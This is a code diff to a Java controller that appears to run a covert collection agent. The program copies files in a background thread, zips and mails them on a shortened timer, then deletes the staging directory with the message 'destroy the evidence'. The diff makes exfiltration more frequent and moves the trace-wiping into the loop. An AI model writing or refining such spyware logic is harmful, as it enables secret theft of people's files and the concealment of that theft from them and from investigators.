@@ -4,9 +4,6 @@ public class Controller {
 	
 	public static void main(String args[]){
 		
-	//start with an empty folder
-		DeleteDirectory d = new DeleteDirectory();
-		d.Delete();
 		
 	//start the thread to copy files as tHe agent runs. 
 			Thread f = new Thread(new CopyFiles());
@@ -21,7 +18,7 @@ public class Controller {
 	 		
 	while(true){
 		try {
-			Thread.sleep(600000);
+			Thread.sleep(100000);
 		} catch (InterruptedException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -32,13 +29,14 @@ public class Controller {
 			m.zipandmail();
 			System.out.println("mailem");
 	//Delete the Directory
+			DeleteDirectory d = new DeleteDirectory();
 			d.Delete();
 			
 			
 			System.out.println("destroy the evidence");
 	//wait  ten minutes
 	try {
-		Thread.sleep(600000);
+		Thread.sleep(100000);
 	} catch (InterruptedException e) {
 		// TODO Auto-generated catch block
 		e.printStackTrace();
